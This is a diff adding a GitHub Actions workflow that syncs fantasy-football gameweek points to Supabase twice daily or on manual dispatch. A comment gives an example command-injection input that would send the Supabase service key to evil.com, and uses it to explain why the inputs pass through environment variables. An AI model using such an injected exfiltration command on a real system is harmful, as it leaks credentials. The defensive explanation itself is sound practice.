@@ -1,0 +1,58 @@
+name: Sync gameweek points
+
+# Core-Insights refreshes twice a day, at 07:30 and 17:30 UTC. These runs sit an
+# hour after each refresh so they always see the newest data rather than racing it.
+# 08:30 UTC = 18:30 Brisbane · 18:30 UTC = 04:30 Brisbane next day.
+on:
+  schedule:
+    - cron: '30 8 * * *'
+    - cron: '30 18 * * *'
+  workflow_dispatch:
+    inputs:
+      gw:
+        description: 'Gameweek or range to sync (e.g. 5 or 1-38). Blank = the most recent few.'
+        required: false
+        default: ''
+      full_resync:
+        description: 'Re-sync every gameweek of the season, not just the recent ones'
+        type: boolean
+        required: false
+        default: false
+
+concurrency:
+  group: sync-gameweek
+  cancel-in-progress: false
+
+jobs:
+  sync:
+    runs-on: ubuntu-latest
+    timeout-minutes: 30
+    steps:
+      - uses: actions/checkout@v4
+
+      - uses: actions/setup-python@v5
+        with:
+          python-version: '3.12'
+          cache: pip
+
+      - run: pip install -r requirements.txt
+
+      # The dispatch inputs are passed through env, never interpolated into the script
+      # with ${{ }}. Template expansion happens before bash parses the line, so an
+      # input like  x"; curl -d "$SUPABASE_SERVICE_KEY" evil.com; #  would execute as
+      # shell on a step that has the service key in its environment.
+      - name: Sync gameweek points to Supabase
+        env:
+          SUPABASE_URL: ${{ secrets.SUPABASE_URL }}
+          SUPABASE_SERVICE_KEY: ${{ secrets.SUPABASE_SERVICE_KEY }}
+          GW: ${{ github.event.inputs.gw }}
+          FULL_RESYNC: ${{ github.event.inputs.full_resync }}
+        run: |
+          set -euo pipefail
+          if [ -n "${GW:-}" ]; then
+            python3 sync_gameweek.py --push --gw "$GW"
+          elif [ "${FULL_RESYNC:-}" = "true" ]; then
+            python3 sync_gameweek.py --push
+          else
+            python3 sync_gameweek.py --push --latest 3
+          fi
